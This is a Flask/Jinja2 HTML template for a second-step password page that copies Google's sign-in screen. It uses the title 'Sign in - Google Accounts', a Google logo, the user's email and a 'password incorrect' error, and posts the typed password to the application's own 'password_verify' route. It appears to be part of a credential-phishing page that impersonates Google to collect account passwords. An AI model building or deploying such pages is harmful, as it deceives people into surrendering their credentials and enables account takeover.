<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='css/auth_pass.css') }}">
</head>
<body>
    <div class="container">
        <div class="signin-box">
            <!-- Google logo -->
            <div class="logo">
                <img src="{{ url_for('static', filename='img/login_img/google_icon.png') }}" alt="Google Logo">
            </div>

            <!-- Sign in text -->
            <h1>Welcome</h1>
            <p class="subtext">Sign in to continue</p>

            <!-- Display the user's email -->
            <p class="user-email">{{ email }}</p>

            <!-- Display error message if password is incorrect -->
            {% if error %}
            <div class="error-message">
                <p>The password you entered is incorrect. Please try again.</p>
            </div>
            {% endif %}

            <!-- Password input form -->
            <form action="{{ url_for('password_verify', email=email) }}" method="POST">
                <div class="input-field">
                    <input type="password" name="password" placeholder="Enter your password" required>
                </div>

                <!-- Forgot password link -->
                <div class="forgot-email">
                    <a href="{{ url_for('login') }}">Back to Login</a>
                </div>

                <!-- Buttons -->
                <div class="actions">
                    <button type="submit" class="next-button">Next</button>
                </div>                
            </form>
        </div>

        <!-- Footer with links -->
        <div class="footer">
            <div class="footer-links">
                <a href="#">Help</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
            </div>
        </div>
    </div>
</body>
</html>
